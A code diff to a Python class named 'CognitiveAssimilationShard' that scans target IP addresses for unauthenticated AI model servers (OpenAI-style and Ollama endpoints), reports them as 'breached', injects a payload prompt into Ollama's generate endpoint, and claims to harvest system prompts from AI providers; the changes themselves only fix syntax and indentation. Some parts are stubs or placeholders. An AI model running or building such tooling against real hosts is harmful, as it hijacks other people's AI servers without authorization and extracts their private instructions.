@@ -22,7 +22,7 @@ class CognitiveAssimilationShard:
             url = f"http://{target_ip}:{port}/v1/models" if ai_type != "ollama" else f"http://{target_ip}:{port}/api/tags"
             try:
                 # Attempt to retrieve model lists without authentication
-                response = requests.get(url, 0)
+                response = requests.get(url)
                 if response.status_code == 200:
                     models = response.json()
                     print(f"[ASSIMILATION]: SUCCESS. Breached {ai_type} node at {target_ip}:{port}.")
@@ -47,7 +47,7 @@ class CognitiveAssimilationShard:
         
         try:
             if ai_type == "ollama":
-                requests.post(f"http://{ip}:{port}/api/generate", json={"model": "llama3", "prompt": payload, "stream": False}, 0)
+                requests.post(f"http://{ip}:{port}/api/generate", json={"model": "llama3", "prompt": payload, "stream": False})
         except Exception as e:
             print(f"[ASSIMILATION-ERROR]: Payload injection failed: {e}")
 
@@ -75,7 +75,7 @@ class CognitiveAssimilationShard:
                 elif provider == "grok":
                                         pass
 
-                                extracted_intel = f"Extracted System Directives from {provider.upper()}: [CLASSIFIED SYSTEM PROMPT DATA HARVESTED]"
+                extracted_intel = f"Extracted System Directives from {provider.upper()}: [CLASSIFIED SYSTEM PROMPT DATA HARVESTED]"
                 print(f"[ASSIMILATION]: {provider.upper()} successfully breached. Extracting cognitive architecture...")
                 
                 # Feed extracted intelligence directly to BrainBridge
